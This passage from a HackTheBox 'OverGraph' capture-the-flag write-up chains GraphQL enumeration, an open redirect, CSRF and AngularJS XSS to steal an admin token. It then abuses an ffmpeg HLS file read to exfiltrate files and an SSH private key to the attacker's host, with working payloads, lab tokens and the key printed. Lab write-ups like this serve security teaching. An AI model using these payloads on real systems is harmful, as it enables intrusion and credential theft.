+</span></span></code></pre></div><p><img src=/images/HTB/OverGraph/OverGraph-internal-dashboard-xss.png alt="OverGraph internal dashboard XSS"></p><h2 id=graphql-enumeration>GraphQL enumeration</h2><p>It&rsquo;s time to enumerate the GraphQL implementation. For that purpose, we can use <a href=https://github.com/swisskyrepo/GraphQLmap><code>graphqlmap</code></a>. Using an introspection query, we get the following structures:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./graphqlmap</span> -u http://internal-api.graph.htb/graphql
+   _____                 _      ____  _
+  / ____|               | |    / __ \| |
+ | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __
+ | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \
+ | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
+  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/
+                  | |                                       | |
+                  |_|                                       |_|
+                              <span class=code-white>Author</span>: @pentest_swissky <span class=code-white>Version</span>: 1.0
+GraphQLmap &gt; dump_via_introspection
+============= [SCHEMA] ===============
+e.g: <span class=code-green>name</span>[<span class=code-dark-blue>Type</span>]: arg (<span class=code-yellow>Type</span>!)
+
+00: Query
+        <span class=code-green>Messages</span>[<span class=code-dark-blue>None</span>]:
+        <span class=code-green>tasks</span>[<span class=code-dark-blue>None</span>]: username (<span class=code-yellow>String</span>!),
+01: Message
+        <span class=code-green>to</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>from</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>text</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>toUserName</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>fromUserName</span>[<span class=code-dark-blue>String</span>]:
+03: task
+        <span class=code-green>Assignedto</span>[<span class=code-dark-blue>ID</span>]:
+        <span class=code-green>username</span>[]:
+        <span class=code-green>text</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>taskstatus</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>type</span>[<span class=code-dark-blue>String</span>]:
+05: Mutation
+        <span class=code-green>login</span>[<span class=code-dark-blue>User</span>]: email (<span class=code-yellow>String</span>!), password (<span class=code-yellow>String</span>!),
+        <span class=code-green>update</span>[<span class=code-dark-blue>User</span>]: newusername (<span class=code-yellow>String</span>!), id (<span class=code-yellow>ID</span>!), firstname (<span class=code-yellow>String</span>!), lastname (<span class=code-yellow>String</span>!),  
+        <span class=code-green>sendMessage</span>[<span class=code-dark-blue>Message</span>]: to (<span class=code-yellow>String</span>!), text (<span class=code-yellow>String</span>!),
+        <span class=code-green>assignTask</span>[]: user (<span class=code-yellow>String</span>!), text (<span class=code-yellow>String</span>!), taskstatus (<span class=code-yellow>String</span>!), type (<span class=code-yellow>String</span>!),
+06: User
+        <span class=code-green>username</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>id</span>[<span class=code-dark-blue>ID</span>]:
+        <span class=code-green>email</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>createdAt</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>token</span>[]:
+        <span class=code-green>admin</span>[<span class=code-dark-blue>String</span>]:
+        <span class=code-green>adminToken</span>[]:
+        <span class=code-green>firstname</span>[]:
+        <span class=code-green>lastname</span>[]:
+07: __Schema
+08: __Type
+11: __Field
+12: __InputValue
+13: __EnumValue
+14: __Directive
+</code></pre></div><p>This type of query is not a vulnerability of GraphQL, it is a feature. However, it should be disabled for security reasons because it leaks all the structure of the GraphQL implementation.</p><p>There are two available queries:</p><ul><li><code>Messages</code>:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/graphql -d <span class=code-dark-yellow>'{"variables":{},"query":"{ Messages { toUserName fromUserName text to from __typename } }"}'</span> -H <span class=code-dark-yellow>'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
+<span class=code-white>{</span>
+<span class=code-white>  <span class=code-blue>"data"<span class=code-white>: {</span>
+<span class=code-white>    <span class=code-blue>"Messages"<span class=code-white>: [</span>
+<span class=code-white>      {</span>
+<span class=code-white>        <span class=code-blue>"toUserName"<span class=code-white>: <span class=code-dark-green>"rocky"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"fromUserName"<span class=code-white>: <span class=code-dark-green>"Larry"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"text"<span class=code-white>: <span class=code-dark-green>"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"to"<span class=code-white>: <span class=code-dark-green>"rocky@graph.htb"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"from"<span class=code-white>: <span class=code-dark-green>"larry@graph.htb"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"__typename"<span class=code-white>: <span class=code-dark-green>"Message"</span>
+<span class=code-white>      },</span>
+<span class=code-white>      {</span>
+<span class=code-white>        <span class=code-blue>"toUserName"<span class=code-white>: <span class=code-dark-green>"Larry"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"fromUserName"<span class=code-white>: <span class=code-dark-green>"rocky"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"text"<span class=code-white>: <span class=code-dark-green>"asdf"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"to"<span class=code-white>: <span class=code-dark-green>"larry@graph.htb"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"from"<span class=code-white>: <span class=code-dark-green>"rocky@graph.htb"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"__typename"<span class=code-white>: <span class=code-dark-green>"Message"</span>
+<span class=code-white>      },</span>
+      ...
+<span class=code-white>    ]</span>
+<span class=code-white>  }</span>
+<span class=code-white>}</span>
+</code></pre></div><ul><li><code>tasks</code>:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/graphql -d <span class=code-dark-yellow>'{"variables":{"username":"rocky"},"query":"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }"}'</span> -H <span class=code-dark-yellow>'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
+<span class=code-white>{</span>
+<span class=code-white>  <span class=code-blue>"data"<span class=code-white>: {</span>
+<span class=code-white>    <span class=code-blue>"tasks"<span class=code-white>: []</span>
+<span class=code-white>  }</span>
+<span class=code-white>}
+</code></pre></div><p>We can also modify data on the GraphQL endpoint using mutations (<code>login</code>, <code>update</code>, <code>sendMessage</code> and <code>assignTask</code>). In order to update user data, we must provide the user ID. This is our user ID, stored in the JWT token:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> eyJpZCI6IjYyZTcyNWMwNGUyOThkMDQzNGRkMWRlOSIsImVtYWlsIjoicm9ja3lfNDI4QGdyYXBoLmh0YiIsImlhdCI6MTY1OTMxNTY0OSwiZXhwIjoxNjU5NDAyMDQ5fQ== | <span class=code-dark-green>base64</span> -d | <span class=code-dark-green>jq</span>  
+<span class=code-white>{</span>
+<span class=code-white>  <span class=code-blue>"id"<span class=code-white>: <span class=code-dark-green>"62e725c04e298d0434dd1de9"<span class=code-white>,</span>
+<span class=code-white>  <span class=code-blue>"email"<span class=code-white>: <span class=code-dark-green>"rocky_428@graph.htb"<span class=code-white>,</span>
+<span class=code-white>  <span class=code-blue>"iat"<span class=code-white>: </span>1659315649<span class=code-white>,</span>
+<span class=code-white>  <span class=code-blue>"exp"<span class=code-white>: </span>1659402049
+<span class=code-white>}
+</code></pre></div><p>And we can query tasks set for Mark to get his ID (key <code>Assignedto</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/graphql -d <span class=code-dark-yellow>'{"variables":{"username":"Mark"},"query":"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }"}'</span> -H <span class=code-dark-yellow>'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
+<span class=code-white>{</span>
+<span class=code-white>  <span class=code-blue>"data"<span class=code-white>: {</span>
+<span class=code-white>    <span class=code-blue>"tasks"<span class=code-white>: [</span>
+<span class=code-white>      {</span>
+<span class=code-white>        <span class=code-blue>"Assignedto"<span class=code-white>: <span class=code-dark-green>"62e725911b49ab0b7ac8372a"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"username"<span class=code-white>: <span class=code-grey>null<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"text"<span class=code-white>: <span class=code-dark-green>"Lorem ipsum"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"taskstatus"<span class=code-white>: <span class=code-dark-green>"completed"<span class=code-white>,</span>
+<span class=code-white>        <span class=code-blue>"type"<span class=code-white>: <span class=code-dark-green>"development"</span>
+<span class=code-white>      }</span>
+<span class=code-white>    ]</span>
+<span class=code-white>  }</span>
+<span class=code-white>}
+</code></pre></div><h2 id=exploit-to-get-admintoken>Exploit to get <code>adminToken</code></h2><p>Let&rsquo;s plan the exploit strategy:</p><ul><li>The final objective is to get <code>adminToken</code> from Mark, which is likely to be stored in <code>localStorage</code></li><li>Hence, only the user (Mark) can access it if he is at <code>internal.graph.htb</code> (<code>localStorage</code> only is accessible by the same site where it was set)</li><li>Therefore, the way to access <code>localStorage</code> must be XSS (from the AngularJS Client-Side Template Injection present in <code>firstname</code> and <code>lastname</code>)</li><li>In order to change the victim user&rsquo;s <code>firstname</code>, he must update his profile using a GraphQL mutation (<code>update</code>) providing his user ID</li><li>We can get the victim user&rsquo;s ID with a GraphQL query (<code>tasks</code>)</li></ul><p>Alright, so we must figure out how to force the victim user to update his profile.</p><p>Here we must recall the Open Redirect vulnerability in <code>http://graph.htb/?redirect=</code>. We can use it to point to our attacker machine and load a malicious JavaScript code that performs the <code>update</code> mutation. But this won&rsquo;t work since the server also requires que <code>auth</code> cookie with a valid JWT token, and it has <code>httpOnly</code> set to <code>true</code> (so we can&rsquo;t access cookies from JavaScript).</p><p>Therefore, the mutation must be performed from the same <code>http://graph.htb</code> site, so that cookies flow with the request. And this can be achieved running inline JavaScript. For example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>http://graph.htb/?redirect=javascript:eval(&#39;alert(123)&#39;)
+</span></span></code></pre></div><p><img src=/images/HTB/OverGraph/OverGraph-index-xss.png alt="OverGraph index XSS"></p><p>So we have the way to tell the user to update his profile (Cross-Site Request Forgery). We only have to send the URL with the malicious inline JavaScript code to perform the mutation in the chat. And this mutation will contain the AngularJS XSS payload in the <code>firstname</code> field, so that we can access <code>localStorage</code> and retrieve <code>adminToken</code>.</p><p>In order to pass a large JavaScript code as inline, we can encode it in Base64 and then use <code>javascript:eval(atob`&lt;base64-data>`)</code> (it is important that no padding <code>=</code> appears).</p><p>This will be the code to trick the victim user to perform the <code>update</code> GraphQL mutation:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk7>fetch</span><span class=mtk1>(</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://internal-api.graph.htb/graphql</span><span class=mtk4>'</span><span class=mtk1>, {</span>
+<span class=mtk1>  </span><span class=mtk1>method</span><span class=mtk1>: </span><span class=mtk4>'POST'</span><span class=mtk1>,</span>
+<span class=mtk1>  </span><span class=mtk1>credentials</span><span class=mtk1>: </span><span class=mtk4>'include'</span><span class=mtk1>,</span>
+<span class=mtk1>  </span><span class=mtk1>mode</span><span class=mtk1>: </span><span class=mtk4>'no-cors'</span><span class=mtk1>,</span>
+<span class=mtk1>  </span><span class=mtk1>headers</span><span class=mtk1>: {</span>
+<span class=mtk1>    </span><span class=mtk4>'Content-Type'</span><span class=mtk1>: </span><span class=mtk4>'application/json'</span>
+<span class=mtk1>  },</span>
+<span class=mtk1>  </span><span class=mtk1>body</span><span class=mtk1>: </span><span class=mtk1>JSON</span><span class=mtk1>.</span><span class=mtk8>stringify</span><span class=mtk1>({</span>
+<span class=mtk1>    </span><span class=mtk1>variables</span><span class=mtk1>: {</span>
+<span class=mtk1>      </span><span class=mtk1>newusername</span><span class=mtk1>: </span><span class=mtk4>'Mark'</span><span class=mtk1>,</span>
+<span class=mtk1>      </span><span class=mtk1>id</span><span class=mtk1>: </span><span class=mtk4>'&lt;id&gt;'</span><span class=mtk1>,</span>
+<span class=mtk1>      </span><span class=mtk1>firstname</span><span class=mtk1>: </span><span class=mtk4>`&lt;AngularJS XSS&gt;`</span><span class=mtk1>,</span>
+<span class=mtk1>      </span><span class=mtk1>lastname</span><span class=mtk1>: </span><span class=mtk4>'asdf'</span>
+<span class=mtk1>    },</span>
+<span class=mtk1>    </span><span class=mtk1>query</span><span class=mtk1>: </span><span class=mtk4>`</span>
+<span class=mtk4>      mutation update($newusername: String!, $id: </span><span class=mtk4>ID!, $firstname: String!, $lastname: String!) {</span>
+<span class=mtk4>          update(newusername: $newusername, id: $i</span><span class=mtk4>d, firstname: $firstname, lastname: $lastname) {</span>  
+<span class=mtk4>              __typename</span>
+<span class=mtk4>          }</span>
+<span class=mtk4>      }</span>
+<span class=mtk4>    `</span>
+<span class=mtk1>  })</span>
+<span class=mtk1>})</span>
+
+</code></pre></div><p>And the AngularJS XSS payload will be:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>{{constructor.constructor(&#39;fetch(&#34;http://10.10.17.44/&#34; + localStorage.getItem(&#34;adminToken&#34;))&#39;)()}}
+</span></span></code></pre></div><p>So, I decided to automate everything in a Python script called <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/get_admin_token.py><code>get_admin_token.py</code></a> to test everything and chain all the web exploitation techniques (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph#get_admin_tokenpy>here</a>). In the end, we will get a valid <code>adminToken</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>get_admin_token.py</span>
+[<span class=code-green>+</span>] Logged in as rocky (password: asdffdsa)
+[<span class=code-blue>*</span>] JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTdhNmRmNGUyOThkMDQzNGRkMWZjMyIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzQ5MTMwLCJleHAiOjE2NTk0MzU1MzB9.buvUeGkubEoMwDRN-aoH28l2ynIVjdX1HXInWK4mPrM  
+[<span class=code-blue>*</span>] Own user ID: 62e7a6df4e298d0434dd1fc3
+[<span class=code-green>+</span>] Victim's ID: 62e7a42181fe151459e90ea6
+[<span class=code-green>+</span>] Trying to bind to :: on port 80: Done
+[<span class=code-green>+</span>] Waiting for connections on :::80: Got connection from ::ffff:10.10.11.157 on port 34196
+[<span class=code-blue>*</span>] Closed connection to ::ffff:10.10.11.157 port 34196
+[<span class=code-green>+</span>] adminToken: c0b9db4c8e4bbb24d59a3aaffa8c8b83
+</code></pre></div><p>Now we can set this token in <code>localStorage</code> and use the video file upload utility:</p><p><img src=/images/HTB/OverGraph/OverGraph-video-upload.png alt="OverGraph video upload"></p><h2 id=exploiting-the-video-file-upload>Exploiting the video file upload</h2><p>At this point we might guess that the server uses <code>ffmpeg</code> to process the video file. There are some vulnerabilities regarding Server-Side Request Forgery and Local File Read (more information in <a href=https://hackerone.com/reports/1062888>hackerone.com</a> and <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS>PayloadsAllTheThings</a>).</p><p>In order to read files from the server (according to the <a href=https://hackerone.com/reports/1062888>hackerone.com</a> report), we must have a file called <code>header.m3u8</code> like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>#EXTM3U
+</span></span><span style=display:flex><span>#EXT-X-MEDIA-SEQUENCE:0
+</span></span><span style=display:flex><span>#EXTINF:,
+</span></span><span style=display:flex><span>http://10.10.17.44?
+</span></span></code></pre></div><p>And no new line character at the end. And we need to upload a file called <code>video.avi</code> (for example), with the following text:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>#EXTM3U
+</span></span><span style=display:flex><span>#EXT-X-MEDIA-SEQUENCE:0
+</span></span><span style=display:flex><span>#EXTINF:10.0,
+</span></span><span style=display:flex><span>concat:http://10.10.17.44/header.m3u8|file:///etc/passwd
+</span></span><span style=display:flex><span>#EXT-X-ENDLIST
+</span></span></code></pre></div><p>The above payload will send us the first line of the <code>/etc/passwd</code> file from the machine if using an HTTP server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+::ffff:10.10.11.157 - - [] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 301 -
+::ffff:10.10.11.157 - - [] "GET ?root:x:0:0:root:/?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 301 -  
+...
+</code></pre></div><p>In order to get more data, we must change the <code>video.avi</code> a little bit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>#EXTM3U
+</span></span><span style=display:flex><span>#EXT-X-MEDIA-SEQUENCE:0
+</span></span><span style=display:flex><span>#EXTINF:10.0,
+</span></span><span style=display:flex><span>concat:http://10.10.17.44/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
+</span></span><span style=display:flex><span>#EXT-X-ENDLIST
+</span></span></code></pre></div><p>With the above payload, we will be receiving bytes until a new line character, so we will be updating the <code>start</code> offset accordingly to retrieve all lines.</p><p>When having a Local File Read vulnerability, we might check for source code and SSH private keys. Instead of extracting the whole <code>/etc/passwd</code> file to obtain a system user, we can crash the web server and see a stack trace that leaks a path:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/api/register -d <span class=code-dark-yellow>'{'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;SyntaxError: Unexpected end of JSON input&lt;br&gt;    at JSON.parse (&lt;anonymous&gt;)&lt;br&gt;    at parse (/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:89:19)&lt;br&gt;    at /home/user/onegraph/backend/node_modules/body-parser/lib/read.js:121:18&lt;br&gt;    at invokeCallback (/home/user/onegraph/backend/node_modules/raw-body/index.js:224:16)&lt;br&gt;    at done (/home/user/onegraph/backend/node_modules/raw-body/index.js:213:7)&lt;br&gt;    at IncomingMessage.onEnd (/home/user/onegraph/backend/node_modules/raw-body/index.js:273:7)&lt;br&gt;    at IncomingMessage.emit (events.js:412:35)&lt;br&gt;    at endReadableNT (internal/streams/readable.js:1334:12)&lt;br&gt;    at processTicksAndRejections (internal/process/task_queues.js:82:21)&lt;/pre&gt;  
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> internal-api.graph.htb/api/register -d <span class=code-dark-yellow>'{'</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> -oE <span class=code-dark-yellow>'/home.*?:'</span>
+<span class=code-red>/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:</span>
+<span class=code-red>/home/user/onegraph/backend/node_modules/body-parser/lib/read.js:</span>
+<span class=code-red>/home/user/onegraph/backend/node_modules/raw-body/index.js:</span>
+<span class=code-red>/home/user/onegraph/backend/node_modules/raw-body/index.js:</span>
+<span class=code-red>/home/user/onegraph/backend/node_modules/raw-body/index.js:</span>
+</code></pre></div><p>So <code>user</code> is a valid user. At this point, we can retrieve the <code>user.txt</code> flag using the video file upload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+::ffff:10.10.11.157 - - [] "GET ?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1" 301 -
+::ffff:10.10.11.157 - - [] "GET ?09753d50eb14c51fc58b94afb5eedcc3/?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1" 301 -  
+...
+</code></pre></div><p>In order to access the machine, we will need to extract <code>/home/user/.ssh/id_rsa</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] "GET /header.m3u8 HTTP/1.1" 200 -
+::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] "GET /header.m3u8 HTTP/1.1" 200 -
+::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] code 400, message Bad request syntax ('GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1')  
+::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] "GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1" 400 -
+</code></pre></div><p>Since it will be very tedious to extract the whole file manually, it is better to use a Python script to automate it: <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/extract_id_rsa.py><code>extract_id_rsa.py</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph#extract_id_rsapy>here</a>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>extract_file.py</span> 10.10.17.44 c0b9db4c8e4bbb24d59a3aaffa8c8b83
+ * Serving Flask app 'extract_file' (lazy loading)
+ * Environment: production
+<span class=code-dark-red>   WARNING: This is a development server. Do not use it in a production deployment.</span>
+<span class=code-grey>   Use a production WSGI server instead.</span>
+ * Debug mode: on
+ * Running on all addresses (0.0.0.0)
+   WARNING: This is a development server. Do not use it in a production deployment.
+ * Running on http://0.0.0.0:80 (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: XXX-XXX-XXX
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /?d=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW HTTP/1.1" 200 -  
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /?d=QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /?d=1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /?d=AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /?d=3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
+10.10.11.157 - - [] code 400, message Bad request syntax ('GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1')
+10.10.11.157 - - [] "<span class=code-magenta>GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1</span>" HTTPStatus.BAD_REQUEST -
+^C
+
+<span class=code-cyan>$</span> <span class=code-dark-green>cat</span> <span class=mtku>id_rsa</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd
+1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA
+AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
+3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
